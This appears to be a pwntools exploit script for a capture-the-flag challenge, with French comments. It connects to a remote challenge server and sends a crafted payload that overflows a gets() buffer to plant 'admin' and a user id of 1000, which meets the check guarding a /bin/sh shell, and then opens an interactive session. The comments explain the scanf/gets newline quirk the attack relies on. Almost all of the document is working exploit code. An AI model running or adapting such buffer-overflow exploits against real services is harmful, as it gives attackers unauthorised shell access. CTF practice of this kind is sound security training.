#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)

# p = process("./bin")
p = remote("cytech.tcdn.casa", 4005)

userid = b"1"
username = flat(
    {
        0: b"admin\0",
        124: p32(1000),
    }
)

payload = userid + username
log.hexdump(payload)
p.sendlineafter(b": ", payload)
p.interactive()

# ici, le scanf lit uniquement un int depuis l'entree, donc
# is on tape "1" puis ENTER (donc un \n), le buffer l'a lu que le 1,
# et le \n reste en 'attente' de lecture pour la prochaine fonction de lecture.
# celle ci sera gets qui lira directement un \n et donc considerera qu un chaine
# vide a ete passee en username.

# il faut donc ecrire en une seule fois le contenu de userid et username:
# par ex:
#    88MYUSERNAME
# comme ca, scanf lit 88, et il reste MYUSERNAME qui sera lu plus tard par gets.

# on envoie un payload contenant "admin\0" a l'offset 0, et l'int 1000 a l'offset 124
# pour satisfaire la condition d'entree dans le /bin/sh
# (username == "admin" && userid == 1000)
